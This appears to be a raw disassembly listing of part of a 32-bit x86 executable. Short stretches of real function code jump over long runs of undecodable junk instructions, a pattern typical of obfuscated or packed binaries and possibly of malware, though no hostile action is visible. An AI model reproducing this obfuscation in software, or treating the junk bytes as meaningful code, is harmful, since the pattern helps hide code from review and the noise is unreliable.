  405467:	mov    esi,DWORD PTR [ebp+0x10]
  40546a:	mov    DWORD PTR [esi+0x10],eax
  40546d:	mov    eax,eax
  40546f:	mov    eax,DWORD PTR [ebp+0x8]
  405472:	xor    eax,ecx
  405474:	add    eax,edx
  405476:	pop    esi
  405477:	leave  
  405478:	ret    0x18
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	mov    eax,DWORD PTR [ebp+0xc]
  405481:	xor    edx,edx
  405483:	mov    ecx,0x7264fcad
  405488:	jmp    0x40559b
  40548d:	enter  0x8006,0xb
  405491:	inc    edx
  405492:	lea    ebx,[ebx-0x27]
  405495:	mov    dl,0x23
  405497:	sub    dh,BYTE PTR [eax]
  405499:	dec    ecx
  40549a:	outs   dx,BYTE PTR ds:[esi]
  40549b:	add    BYTE PTR [esi+0x7c7c2b2a],0x62
  4054a2:	jl     0x405520
  4054a4:	jl     0x405457
  4054a6:	xchg   DWORD PTR [esi],edx
  4054a8:	sub    eax,0x9f71756
  4054ad:	int    0x68
  4054af:	mov    ds:0x46a423b9,eax
  4054b4:	add    BYTE PTR [edi],dh
  4054b6:	xchg   edx,eax
  4054b7:	rol    DWORD PTR [edi],0x83
  4054ba:	jmp    0xaecf:0x6a7b3d22
  4054c1:	mov    ebp,0x3939ab14
  4054c6:	(bad)  
  4054c8:	ret    
  4054c9:	sar    BYTE PTR [ecx-0x35],cl
  4054cc:	jno    0x4054e5
  4054ce:	dec    edi
  4054cf:	sbb    eax,DWORD PTR [eax]
  4054d1:	test   al,0x61
  4054d3:	imul   eax,DWORD PTR [ebx],0x4cfdaa5d
  4054d9:	sbb    dl,BYTE PTR [edx]
  4054db:	sbb    bl,BYTE PTR [ebx-0x797f1a6c]
  4054e1:	xor    DWORD PTR ds:0x5749a95d,edx
  4054e7:	(bad)  
  4054e8:	das    
  4054e9:	mov    al,ds:0xf4e8a018
  4054ee:	repz mov dh,0x23
  4054f1:	jne    0x40550c
  4054f3:	rcl    DWORD PTR [eax-0x29],1
  4054f6:	in     al,dx
  4054f7:	out    dx,eax
  4054f8:	fwait
  4054f9:	mov    esp,0x9dc90061
  4054fe:	push   esp
  4054ff:	mov    ebp,0xec9d518e
  405504:	xchg   esp,eax
  405505:	ja     0x4054a5
  405507:	mov    bh,0xfe
  405509:	cld    
  40550a:	les    edx,FWORD PTR [edi-0x24]
  40550d:	loop   0x405530
  40550f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405510:	jno    0x40553b
  405512:	(bad)  
  405514:	jmp    0xcf35562c
  405519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551a:	push   0xe10c94f2
  40551f:	mov    dh,ch
  405521:	or     al,BYTE PTR [edi]
  405523:	ins    BYTE PTR es:[edi],dx
  405524:	loope  0x405536
  405526:	sub    eax,esi
  405528:	add    eax,0x9a19f5ea
  40552d:	test   BYTE PTR [eax+edi*2],bl
  405530:	jle    0x405596
  405532:	xchg   esp,eax
  405533:	mov    DWORD PTR ds:0x9a34c414,ebp
  405539:	imul   ecx,DWORD PTR [edx+ebp*4+0xfbfd38a],0x1629d36c
  405544:	pop    ebp
  405545:	jecxz  0x4054c9
  405547:	cmp    eax,0xf02a06cd
  40554c:	fist   WORD PTR [edx+ebp*8-0x5d3c60a7]
  405553:	pop    es
  405554:	push   edi
  405555:	mov    eax,ds:0x10f241f4
  40555a:	mov    dh,0x12
  40555c:	frstor [esi-0x34970168]
  405562:	(bad)  [ecx+eax*2+0x617a3f85]
  405569:	aaa    
  40556a:	fadd   DWORD PTR [edi]
  40556c:	push   ds
  40556d:	jb     0x40556b
  40556f:	dec    eax
  405570:	outs   dx,DWORD PTR ds:[esi]
  405571:	cmp    eax,0x9a159c23
  405576:	call   0xe738:0x28cf6adf
  40557d:	push   ss
  40557e:	mov    bl,BYTE PTR [esi-0x61]
  405581:	jmp    0x405574
  405583:	ss jbe 0x4055de
  405586:	mov    bl,0x1c
  405588:	mov    bh,0x7a
  40558a:	mov    esp,0xf9cb6d4c
  40558f:	enter  0xce9a,0xe7
  405593:	and    DWORD PTR [ebp-0x7d],ebp
  405596:	push   0xffffff8c
  405598:	jae    0x4055b6
  40559a:	push   esp
  40559b:	div    ecx
  40559d:	mov    ecx,DWORD PTR [ebp+0x10]
  4055a0:	and    ecx,eax
  4055a2:	or     ecx,0x81161d8f
  4055a8:	mov    eax,ecx
  4055aa:	pop    ebp
  4055ab:	ret    0x18
  4055ae:	push   ebp
  4055af:	mov    ebp,esp
  4055b1:	push   ecx
  4055b2:	xor    edx,edx
  4055b4:	xor    edx,DWORD PTR ds:0x4444d4
  4055ba:	xor    ecx,ecx
  4055bc:	or     ecx,DWORD PTR ds:0x44a700
  4055c2:	sub    edx,ecx
  4055c4:	sub    edx,DWORD PTR [edx+ecx*1]
  4055c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4055ce:	movzx  eax,WORD PTR ds:0x44d424
  4055d5:	adc    DWORD PTR ds:0x424849,eax
  4055db:	jmp    0x405714
  4055e0:	ins    DWORD PTR es:[edi],dx
  4055e1:	je     0x40559f
  4055e3:	xchg   DWORD PTR [ebp+0x47],edx
  4055e6:	jge    0x4055e2
  4055e8:	fs pop ebp
  4055ea:	mov    eax,0x96c33777
  4055ef:	inc    ecx
  4055f0:	adc    BYTE PTR [edx],ch
  4055f2:	jl     0x405670
  4055f4:	sbb    BYTE PTR [edi+0x7c],bh
  4055f7:	jl     0x40559b
  4055f9:	mov    ecx,0xeb12e618
  4055fe:	xor    al,0x74
  405600:	in     eax,dx
  405601:	sti    
  405602:	cdq    
  405603:	ret    0xe12e
  405606:	bound  ecx,QWORD PTR [ebx-0x2bc9378c]
  40560c:	in     eax,0xe8
  40560e:	xchg   BYTE PTR [esi+0x293d9864],dh
  405614:	fucomi st,st(3)
  405616:	inc    ebx
  405617:	mov    ch,0x87
  405619:	lahf   
  40561a:	int    0xd3
  40561c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40561d:	jg     0x40568c
  40561f:	(bad)  
  405620:	pop    edx
  405621:	rcl    ecx,1
  405623:	mov    edx,0xdf4a7741
  405628:	cli    
  405629:	fs add ebx,DWORD PTR fs:[ebx]
  40562d:	ror    DWORD PTR ds:0x975782f5,0x1b
  405634:	les    ebp,FWORD PTR [edi]
  405636:	test   eax,0x78b7d089
  40563b:	and    DWORD PTR [ecx],0xd9155e68
  405641:	push   ss
  405642:	mov    ds:0x46c2f1cc,al
  405647:	stos   DWORD PTR es:[edi],eax
  405648:	test   eax,0xf85a977f
  40564d:	out    dx,eax
  40564e:	lods   eax,DWORD PTR ds:[esi]
  40564f:	shl    BYTE PTR [ebp+0x2f],1
  405652:	adc    BYTE PTR [edi],0x4e
  405655:	jl     0x405672
  405657:	jmp    0xfa8d:0x85cf1e2
  40565e:	xchg   edi,eax
  40565f:	pop    esp
  405660:	stc    
  405661:	mov    dh,cl
  405663:	imul   DWORD PTR [edx]
  405665:	mov    bh,0x12
  405667:	dec    edi
  405668:	cmp    al,bl
  40566a:	inc    eax
  40566b:	shl    BYTE PTR [ecx],1
  40566d:	sti    
  40566e:	iret   
  40566f:	and    al,BYTE PTR [esi-0x636900d]
  405675:	sbb    BYTE PTR [ebx+0x5f],al
  405678:	fcompp 
  40567a:	jnp    0x40568f
  40567c:	cs pop eax
  40567e:	dec    BYTE PTR [ebp+0x4876b420]
  405684:	sub    al,0x4c
  405686:	imul   edx,DWORD PTR [esi+0x4b],0xfffffff2
  40568a:	cli    
  40568b:	mov    dh,0x7c
  40568d:	mov    eax,0x62f2d4c1
  405692:	lods   eax,DWORD PTR ds:[esi]
  405693:	jmp    FWORD PTR [ebp+0x472af05e]
  405699:	adc    ah,BYTE PTR [edi+0x747ef9d1]
  40569f:	pop    ebx
  4056a0:	adc    edi,DWORD PTR [esp+edi*1]
  4056a3:	jo     0x4056ae
  4056a5:	mov    ah,0x4c
  4056a7:	xchg   ebp,eax
  4056a8:	or     eax,0x60bedd9f
  4056ad:	jle    0x4056f5
  4056af:	jns    0x405701
  4056b1:	add    esi,DWORD PTR [ebp-0x3b98afa6]
  4056b7:	xchg   edx,eax
  4056b8:	mov    ecx,0xc95ab394
  4056bd:	outs   dx,BYTE PTR ds:[esi]
  4056be:	sbb    bl,BYTE PTR [esp+eiz*4-0x36da03c4]
  4056c5:	(bad)  
  4056c6:	in     al,dx
  4056c7:	xchg   edx,eax
  4056c8:	and    esp,edi
  4056ca:	cmp    esp,ecx
  4056cc:	inc    esi
  4056cd:	ffree  st(5)
  4056cf:	pop    edi
  4056d0:	mov    ebp,0x1aba66fe
  4056d5:	mov    bh,BYTE PTR [eax-0x48ba8ff0]
  4056db:	fwait
  4056dc:	dec    esi
  4056dd:	out    0x43,al
  4056df:	and    esi,DWORD PTR [esi]
  4056e1:	jb     0x40566d
  4056e3:	mov    edx,ecx
  4056e5:	enter  0x1b07,0x53
  4056e9:	pop    esp
  4056ea:	shl    ebx,cl
  4056ec:	call   0x1177:0xfbfd4ae7
  4056f3:	xchg   ecx,eax
  4056f4:	pop    ds
  4056f5:	fdivr  DWORD PTR [esi-0x807edce]
  4056fb:	ins    DWORD PTR es:[edi],dx
  4056fc:	jns    0x405707
  4056fe:	and    bh,BYTE PTR [edi]
  405700:	out    dx,eax
  405701:	cmp    BYTE PTR [esi+0x6c],ah
  405704:	sbb    BYTE PTR [edi],ch
  405706:	outs   dx,BYTE PTR ds:[esi]
  405707:	stc    
  405708:	sbb    al,BYTE PTR ds:0x1be08dad
  40570e:	xchg   edx,eax
  40570f:	jns    0x4056fd
  405711:	sub    al,0xf2
  405713:	jg     0x4056a0
  405715:	inc    ebp
  405716:	cld    
  405717:	mov    edx,DWORD PTR [ebp+0x10]
  40571a:	or     ecx,0x2821
  405720:	mov    ecx,0x7510857
  405725:	not    DWORD PTR ds:0x424865
  40572b:	jmp    0x405864
  405730:	xor    al,dh
  405732:	push   0x65
  405734:	jp     0x40579b
  405736:	fnstsw WORD PTR [ecx-0x7c]
  405739:	mov    ebp,0xae040b79
  40573e:	(bad)  [esi+0x7c7c2d3c]
  405744:	sbb    BYTE PTR [edi+0x7c],bh
  405747:	jl     0x405710
  405749:	hlt    
  40574a:	(bad)  
  40574b:	(bad)  
  40574c:	aam    0x91
  40574e:	jecxz  0x4057c1
  405750:	jle    0x4057d0
  405752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405753:	jg     0x4057a7
  405755:	cli    
  405756:	(bad)  
  405757:	and    eax,0x7931efe6
  40575c:	inc    edx
  40575d:	sub    eax,0x19367a17
  405762:	mov    al,ch
  405764:	jbe    0x40579f
  405766:	mov    ds:0x25327f68,al
  40576b:	fs in  al,0x66
  40576e:	adc    al,0x47
  405770:	mov    eax,ds:0xfd763d6f
  405775:	add    DWORD PTR [ebp+esi*4-0x55],ecx
  405779:	pop    edx
  40577a:	or     ecx,DWORD PTR [ecx-0x6df243f]
  405780:	pop    ss
  405781:	inc    edi
  405782:	dec    eax
  405783:	inc    edx
  405784:	push   0x71429038
  405789:	push   ecx
  40578a:	or     dl,cl
  40578c:	imul   edi,ecx,0xed9bdb2
  405792:	jecxz  0x405749
  405794:	mov    ebx,0x1d131a3b
  405799:	jnp    0x4057a5
  40579b:	mov    ah,0x5b
  40579d:	push   edi
  40579e:	add    al,dh
  4057a0:	stc    
  4057a1:	and    ebx,edi
  4057a3:	mov    BYTE PTR [edx+0x23],0x5f
  4057a7:	sbb    ch,BYTE PTR [ebp-0x6cc5ed9e]
  4057ad:	rcr    DWORD PTR [edi+ebp*8+0xc193214],0xb3
  4057b5:	inc    ecx
  4057b6:	aad    0x33
  4057b8:	sub    ah,BYTE PTR [edx+0x58]
  4057bb:	ins    BYTE PTR es:[edi],dx
  4057bc:	push   ebp
  4057bd:	in     al,dx
  4057be:	or     BYTE PTR [esp+eiz*8+0x2e],ch
  4057c2:	sub    al,0x59
  4057c4:	cli    
  4057c5:	lahf   
  4057c6:	test   BYTE PTR [ecx],ch
  4057c8:	in     al,0xa5
  4057ca:	cmc    
  4057cb:	inc    ebx
  4057cc:	pop    ds
  4057cd:	jns    0x4057ff
  4057cf:	jecxz  0x40582c
  4057d1:	mov    eax,0xa00bbd37
  4057d6:	out    dx,al
  4057d7:	jmp    0x9aa:0xee65e25c
  4057de:	jae    0x405780
  4057e0:	stos   DWORD PTR es:[edi],eax
  4057e1:	stc    
  4057e2:	inc    esp
  4057e3:	sub    ebp,DWORD PTR [edi+0x594bd930]
  4057e9:	ds daa 
  4057eb:	inc    ebp
  4057ec:	ins    BYTE PTR es:[edi],dx
  4057ed:	jne    0x405860
  4057ef:	or     DWORD PTR [ebp+0x45edfd60],esi
  4057f5:	and    ebp,ecx
  4057f7:	xchg   ebx,eax
  4057f8:	sub    eax,0xdc2af6de
  4057fd:	push   0xe8adc877
  405802:	sbb    DWORD PTR [ebp-0x69bf59ee],0x619c9a0a
  40580c:	(bad)  
  40580d:	fst    QWORD PTR [edx+ecx*2-0x50]
  405811:	sbb    bh,BYTE PTR [edx]
  405813:	push   esp
  405814:	mov    ss,WORD PTR [edi+0x663b79af]
  40581a:	mov    edi,0xa3e4e899
  40581f:	test   eax,0x89fc09eb
  405824:	mov    ecx,0x55697ebf
  405829:	xchg   esp,edi
  40582b:	int3   
  40582c:	jmp    0x33570c73
  405831:	pop    es
  405832:	xchg   ecx,eax
  405833:	cmp    ecx,esi
  405835:	and    bh,bh
  405837:	(bad)  
  405839:	dec    esp
  40583a:	pop    ebp
  40583b:	stc    
  40583c:	loop   0x4057db
  40583e:	scas   eax,DWORD PTR es:[edi]
  40583f:	xor    ch,BYTE PTR [esi]
  405841:	into   
  405842:	xor    edi,eax
  405844:	and    DWORD PTR [eax+0x20],esi
  405847:	jae    0x4057f9
  405849:	adc    eax,DWORD PTR cs:0x13ed273f
  405850:	jno    0x4058a8
  405852:	mov    ah,0xb2
  405854:	dec    esi
  405855:	adc    dl,BYTE PTR [ecx-0x2f]
  405858:	ja     0x405858
  40585a:	dec    eax
  40585b:	dec    esi
  40585c:	add    BYTE PTR [eax+0x74991a7a],dl
  405862:	mov    dl,0xf3
  405864:	xor    eax,ecx
  405866:	add    eax,0x32729e
  40586b:	or     DWORD PTR ds:0x42485d,0x447984
  405875:	mov    DWORD PTR [edx],eax
  405877:	neg    edx
  405879:	mov    eax,DWORD PTR [ebp+0x14]
  40587c:	and    DWORD PTR ds:0x447994,0x0
  405886:	xor    edx,edx
  405888:	add    edx,DWORD PTR ds:0x447994
  40588e:	inc    edx
  40588f:	mov    DWORD PTR ds:0x447994,edx
  405895:	cmp    DWORD PTR ds:0x447994,0x14
  40589c:	jne    0x4058b0
  4058a2:	push   DWORD PTR [ebp-0x28]
  4058a5:	push   0x4479a4
  4058aa:	call   DWORD PTR ds:0x442360
  4058b0:	cmp    DWORD PTR ds:0x447994,0x13
  4058b7:	jb     0x405886
  4058bd:	mov    edx,DWORD PTR [ebp+0x10]
  4058c0:	mov    DWORD PTR [edx+0x4],eax
  4058c3:	mov    eax,DWORD PTR [ebp+0x18]
  4058c6:	mov    edx,DWORD PTR [ebp+0x10]
  4058c9:	mov    DWORD PTR [edx+0x8],eax
  4058cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4058cf:	mov    edx,DWORD PTR [ebp+0x10]
  4058d2:	jmp    0x405a0b
  4058d7:	in     eax,0xab
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	push   es
  4058db:	jge    0x4058a3
  4058dd:	imul   edi,DWORD PTR gs:[ecx],0x49
  4058e1:	mov    al,ds:0xdbadecb9
  4058e6:	dec    esi
  4058e7:	fsubr  DWORD PTR [esp+edi*2]
  4058ea:	jl     0x405904
  4058ec:	jg     0x40596a
  4058ee:	jl     0x405936
  4058f0:	fsubr  QWORD PTR [edi+0x3c353f3a]
  4058f6:	arpl   WORD PTR [esp+ebx*2-0x5],ax
  4058fa:	mov    cl,0xff
  4058fc:	xchg   edx,eax
  4058fd:	jmp    0xd904:0xa9517ae8
  405904:	push   edi
  405905:	push   ds
  405906:	into   
  405907:	adc    DWORD PTR [edx],ebp
  405909:	aas    
  40590a:	adc    DWORD PTR [edi-0x30],ecx
  40590d:	test   al,0x66
  40590f:	xchg   edi,eax
  405910:	(bad)  
  405911:	jne    0x40595e
  405913:	sti    
  405914:	das    
  405915:	jae    0x4058f2
  405917:	jl     0x405948
  405919:	rcl    eax,1
  40591b:	daa    
  40591c:	and    BYTE PTR [ecx*4-0x1e501b73],0xc
  405924:	push   ebx
  405925:	mov    esi,0x2bfd5ae
  40592a:	add    bh,BYTE PTR [esi+0x71]
  40592d:	mov    cl,dl
  40592f:	pop    edi
  405930:	push   cs
  405931:	fimul  DWORD PTR [ebp+0x2e539548]
  405937:	out    0x4a,al
  405939:	arpl   WORD PTR [esi-0x6a],si
  40593c:	ret    0xc7d
  40593f:	or     DWORD PTR ds:0xc2850f27,ebx
  405945:	fcom   DWORD PTR [esi]
  405947:	sub    dl,bh
  405949:	mov    bp,sp
  40594c:	ss push ebx
  40594e:	imul   edx,DWORD PTR [ebx],0x3a
  405951:	je     0x40591a
  405953:	test   DWORD PTR [edx],eax
  405955:	push   es
  405956:	jbe    0x4058f2
  405958:	(bad)  
  405959:	sahf   
  40595a:	add    BYTE PTR [esi-0x6],0xdd
  40595e:	sbb    eax,0x7371abc9
  405963:	imul   ebp,DWORD PTR [ecx-0x8],0x7b65671c
  40596a:	mov    esi,0x15a433f
  40596f:	shl    BYTE PTR [ebx-0xe2a589e],1
  405975:	mov    ebx,0xecd2201
  40597a:	xchg   edx,eax
  40597b:	leave  
  40597c:	xlat   BYTE PTR ds:[ebx]
  40597d:	xchg   esp,eax
  40597e:	mov    ?,ebx
  405980:	add    ah,BYTE PTR ds:0xd063274
  405986:	dec    edi
  405987:	loope  0x4059bb
  405989:	icebp  
  40598a:	adc    eax,0x2ae44c85
  40598f:	jne    0x4059f4
  405991:	jge    0x405987
  405993:	sub    dl,al
  405995:	pop    ss
  405996:	and    BYTE PTR [edi+ebp*2-0x32a177d2],bl
  40599d:	xchg   edi,eax
  40599e:	pop    ecx
  40599f:	sub    bh,BYTE PTR ds:0x17a54f4f
  4059a5:	aam    0x5b
  4059a7:	cwde   
  4059a8:	cli    
  4059a9:	in     al,dx
  4059aa:	add    cl,BYTE PTR [ebp*4+0x6ed83d08]
  4059b1:	je     0x40597b
  4059b3:	jne    0x405a16
  4059b5:	pop    edi
  4059b6:	ja     0x40593a
  4059b8:	and    ebx,DWORD PTR [edx+0x7543aa67]
  4059be:	imul   ebp,DWORD PTR [ebp-0x80],0xe7f9bf1c
  4059c5:	and    eax,0xbd89aa2a
  4059ca:	mov    al,0xc
  4059cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059cd:	fmul   DWORD PTR [edx+0xd9c7b64]
  4059d3:	out    0x81,eax
  4059d5:	in     eax,0x7b
  4059d7:	pop    esi
  4059d8:	cmc    
  4059d9:	fdiv   DWORD PTR [ecx-0x34]
  4059dc:	retf   
  4059dd:	imul   edx
  4059df:	jne    0x405985
  4059e1:	loop   0x4059ad
  4059e3:	inc    ebp
  4059e4:	jbe    0x40596e
  4059e6:	ret    0xd1b3
  4059e9:	int3   
  4059ea:	mov    bh,0x46
  4059ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ed:	loopne 0x405973
  4059ef:	pop    esi
  4059f0:	jbe    0x4059d5
  4059f2:	mov    edx,ebp
  4059f4:	mov    eax,0x57444a0e
  4059f9:	adc    eax,0xb070d29f
  4059fe:	ja     0x405a1c
  405a00:	mov    ebp,0xd2429f00
  405a05:	adc    ecx,esp
  405a07:	outs   dx,DWORD PTR ds:[esi]
  405a08:	mov    edx,0x4289ee99
  405a0d:	or     al,0x8b
  405a0f:	inc    ebp
  405a10:	and    BYTE PTR [ebx+0x42891055],cl
  405a16:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405a1c:	test   eax,eax
  405a1e:	jmp    0x405b57
  405a23:	pop    edx
  405a24:	loope  0x405a4a
  405a26:	sbb    bh,BYTE PTR [ebx+0x5f617add]
  405a2c:	retf   
  405a2d:	mov    cl,0x6b
  405a2f:	inc    edx
  405a30:	add    ch,al
  405a32:	push   esi
  405a33:	in     al,0x2f
  405a35:	jl     0x405ab3
  405a37:	sbb    BYTE PTR [edi+0x7c],bh
  405a3a:	jl     0x405a15
  405a3c:	jno    0x405a44
  405a3e:	fwait
  405a3f:	jno    0x405a84
  405a41:	lds    edi,FWORD PTR fs:0xf62c2678
  405a48:	pop    ecx
  405a49:	shl    DWORD PTR [esi-0x38],0xf5
  405a4d:	push   0x1b3de3a1
  405a52:	in     al,0x47
  405a54:	(bad)  
  405a55:	jle    0x4059ee
  405a57:	inc    edx
  405a58:	pop    edi
  405a59:	mov    esp,0xc53818f4
  405a5e:	mov    eax,0xc5eb3830
  405a64:	(bad)  
  405a65:	push   0xffffffb7
  405a67:	add    edx,DWORD PTR [edx]
  405a69:	(bad)  
  405a6a:	inc    ebx
  405a6b:	sar    BYTE PTR [edi+0x1],0xc1
  405a6f:	mov    ebx,0x646a8f94
  405a74:	sub    DWORD PTR [edi+0xa],edx
  405a77:	cmp    eax,0xecc849cd
  405a7c:	enter  0x4661,0xd9
  405a80:	add    BYTE PTR [eax],cl
  405a82:	pusha  
  405a83:	pop    ebp
  405a84:	js     0x405ab7
  405a86:	push   esp
  405a87:	xchg   esp,eax
  405a88:	mov    bh,0x66
  405a8a:	int3   
  405a8b:	fidiv  DWORD PTR [esp+eiz*2+0x6dfd51be]
  405a92:	std    
  405a93:	shl    ebx,cl
  405a95:	sub    BYTE PTR [esi+0x50],0x2a
  405a99:	test   al,0xb3
  405a9b:	push   0xffffffc6
  405a9d:	test   eax,0x436f08ca
  405aa2:	xor    al,0xf
  405aa4:	xor    DWORD PTR [ebp-0x3a0bd0e8],esp
  405aaa:	mov    dl,0x9c
  405aac:	icebp  
  405aad:	mov    bl,0x2e
  405aaf:	dec    esp
  405ab0:	lods   al,BYTE PTR ds:[esi]
  405ab1:	mov    ch,0xde
  405ab3:	inc    esp
  405ab4:	loop   0x405b1a
  405ab6:	std    
  405ab7:	mov    dl,0xa2
  405ab9:	pusha  
  405aba:	add    DWORD PTR [eax],esi
  405abc:	mov    WORD PTR [ebx+0x5f735d93],?
  405ac2:	xchg   esp,eax
  405ac3:	mov    ds:0x6252fe37,al
  405ac8:	loope  0x405b16
  405aca:	jb     0x405aa5
  405acc:	cwde   
  405acd:	pop    ss
  405ace:	out    0x14,eax
  405ad0:	mov    bl,0xb5
  405ad2:	aam    0xde
  405ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ad5:	sub    ah,ah
  405ad7:	hlt    
  405ad8:	rcr    DWORD PTR [ecx+0x60c88f1f],cl
  405ade:	xor    eax,0x450bc731
  405ae3:	cmp    ecx,edi
  405ae5:	sub    al,0xad
  405ae7:	inc    esi
  405ae8:	or     edi,0x5001de56
  405aee:	shl    BYTE PTR ds:0x2395045,cl
  405af4:	lods   eax,DWORD PTR ds:[esi]
  405af5:	aas    
  405af6:	mov    al,ds:0x1ab26722
  405afb:	cmp    eax,0xf93c9fc8
  405b00:	mov    esp,0xd2a5f7e0
  405b05:	scas   al,BYTE PTR es:[edi]
  405b06:	imul   esp,DWORD PTR [eax+edx*1],0xa83cf12f
  405b0d:	lea    ebp,[edx]
  405b0f:	sbb    DWORD PTR [ebx+0x82899bd],esi
  405b15:	sub    bl,ch
  405b17:	mov    al,0x7d
  405b19:	jne    0x405b44
  405b1b:	repz (bad) 
  405b1e:	jp     0x405b37
  405b20:	out    dx,eax
  405b21:	popf   
  405b22:	idiv   dh
  405b24:	cs popa 
  405b26:	mov    ds:0x46272c60,al
  405b2b:	jle    0x405abc
  405b2d:	test   BYTE PTR [eax-0x25],dh
  405b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b31:	icebp  
  405b32:	dec    edx
  405b33:	loopne 0x405b88
  405b35:	lea    ecx,[eax+0x3f098a38]
  405b3b:	imul   ebp,DWORD PTR [esi],0x3a
  405b3e:	and    cl,BYTE PTR [eax-0x79e5a3b2]
  405b44:	addr16 dec esp
  405b46:	xchg   esp,eax
  405b47:	mov    esi,0x3b71ff7a
  405b4c:	ror    DWORD PTR [edx-0x19],0x31
  405b50:	inc    DWORD PTR [bx]
  405b53:	push   cs
  405b54:	ins    DWORD PTR es:[edi],dx
  405b55:	es js  0x405ae3
  405b58:	inc    ebp
  405b59:	or     BYTE PTR [edi],cl
  405b5b:	test   DWORD PTR [ebx],eax
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  405b65:	add    eax,0x32729e
  405b6a:	leave  
  405b6b:	ret    0x1c
  405b6e:	push   ebp
  405b6f:	mov    ebp,esp
  405b71:	sub    esp,0x78
  405b74:	adc    DWORD PTR ds:0x447988,0x7d94
  405b7e:	jmp    0x405caa
  405b83:	or     esp,ebx
  405b85:	dec    ecx
  405b86:	or     BYTE PTR [ecx-0x53],ch
  405b89:	dec    ebp
  405b8a:	aad    0x48
  405b8c:	aas    
  405b8d:	adc    esi,esp
  405b8f:	int    0x81
  405b91:	xor    al,bh
  405b93:	sub    BYTE PTR [esi],0x7c
  405b96:	jl     0x405ba5
  405b98:	jg     0x405c16
  405b9a:	jl     0x405b38
  405b9c:	adc    eax,0x71a4fa29
  405ba1:	ret    0xd12a
  405ba4:	repz mov bl,0x36
  405ba7:	xchg   esp,eax
  405ba8:	sub    ah,BYTE PTR [edi]
  405baa:	push   0x5d5c975c
  405baf:	add    BYTE PTR [edi],dh
  405bb1:	into   
  405bb2:	test   eax,0x6b9d7a81
  405bb7:	scas   eax,DWORD PTR es:[edi]
  405bb8:	fcomp  st(6)
  405bba:	rcl    DWORD PTR [ebp+0x54],0x6f
  405bbe:	adc    DWORD PTR [ecx-0x41],edx
  405bc1:	jnp    0x405b8e
  405bc3:	loope  0x405c0e
  405bc5:	sbb    al,0x26
  405bc7:	rcl    BYTE PTR [ecx],cl
  405bc9:	outs   dx,DWORD PTR ds:[esi]
  405bca:	sbb    DWORD PTR gs:[ecx-0x2e],0xf6bc458f
  405bd2:	iret   
  405bd3:	xchg   edx,eax
  405bd4:	jb     0x405b9e
  405bd6:	push   es
  405bd7:	adc    DWORD PTR [ebx+0x23a7c7ba],edi
  405bdd:	sub    ebx,DWORD PTR [edi-0x24]
  405be0:	jg     0x405bea
  405be2:	xchg   ecx,eax
  405be3:	je     0x405c59
  405be5:	pop    ss
  405be6:	xchg   esp,eax
  405be7:	xor    ebx,DWORD PTR [edi+edi*1+0x57]
  405beb:	sbb    BYTE PTR gs:[eax],0x40
  405bef:	and    dh,BYTE PTR [ebx-0xc]
  405bf2:	clc    
  405bf3:	loop   0x405c56
  405bf5:	cdq    
  405bf6:	lahf   
  405bf7:	pop    es
  405bf8:	sub    ah,BYTE PTR [eax-0x1e]
  405bfb:	imul   esp,DWORD PTR [edi+0x725a80b4],0xf71b7ce2
  405c05:	sar    DWORD PTR [ebx],0x5a
  405c08:	dec    eax
  405c09:	sub    ch,BYTE PTR [ebx-0x68]
  405c0c:	cmp    al,0x9
  405c0e:	sub    al,0x49
  405c10:	push   eax
  405c11:	sbb    al,cl
  405c13:	das    
  405c14:	add    ecx,DWORD PTR [esi-0x2f]
  405c17:	or     cl,BYTE PTR [ebp-0x475573c3]
  405c1d:	jnp    0x405ba9
  405c1f:	dec    esp
  405c20:	call   0x4cfa:0x22637065
  405c27:	outs   dx,BYTE PTR ds:[esi]
  405c28:	jge    0x405c96
  405c2a:	dec    ecx
  405c2b:	jno    0x405c6f
  405c2d:	iret   
  405c2e:	push   cs
  405c2f:	adc    dh,BYTE PTR [ecx-0x77]
  405c32:	lock test eax,0xd10c4380
  405c38:	std    
  405c39:	add    DWORD PTR [edx+0x14c909fc],ebp
  405c3f:	add    DWORD PTR [ebp+0x44],edx
  405c42:	jae    0x405bf0
  405c44:	mov    al,0x82
  405c46:	xchg   edx,eax
  405c47:	xor    eax,0xaa4ab41e
  405c4c:	push   ds
  405c4d:	fst    st(4)
  405c4f:	add    ebp,edi
  405c51:	pop    eax
  405c52:	leave  
  405c53:	sbb    BYTE PTR [edi+0x7c094cd8],dl
  405c59:	or     eax,0x2edd16ba
  405c5e:	adc    esp,edx
  405c60:	pusha  
  405c61:	jbe    0x405bf0
  405c63:	xchg   edx,eax
  405c64:	js     0x405c94
  405c66:	lahf   
  405c67:	adc    edx,edi
  405c69:	push   ss
  405c6a:	hlt    
  405c6b:	mov    BYTE PTR [esi-0x7fb2a5fa],cl
  405c71:	mov    esp,0xbafca5dc
  405c76:	mov    bl,0x29
  405c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c79:	and    eax,0x66248066
  405c7e:	adc    BYTE PTR [esi],dl
  405c80:	nop
  405c81:	(bad)
  405c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c86:	ss mov esp,0xf15e8a93
  405c8c:	mov    bl,BYTE PTR [ebx+0x61]
  405c8f:	std    
  405c90:	mov    ah,0xe6
  405c92:	idiv   BYTE PTR [ecx]
  405c94:	xor    dl,ch
  405c96:	inc    eax
  405c97:	add    BYTE PTR [ecx+eax*4-0x3c],ch
  405c9b:	push   ebx
  405c9c:	lahf   
  405c9d:	inc    ebx
  405c9e:	ret    0x7fc8
  405ca1:	repnz sbb al,0xd4
  405ca4:	or     DWORD PTR [ecx+0x2c],0x2d
  405ca8:	push   ecx
  405ca9:	and    DWORD PTR [ecx+0x4441a0],0xffffff89
  405cb0:	inc    ebp
  405cb1:	lock mov eax,ds:0x4442ac
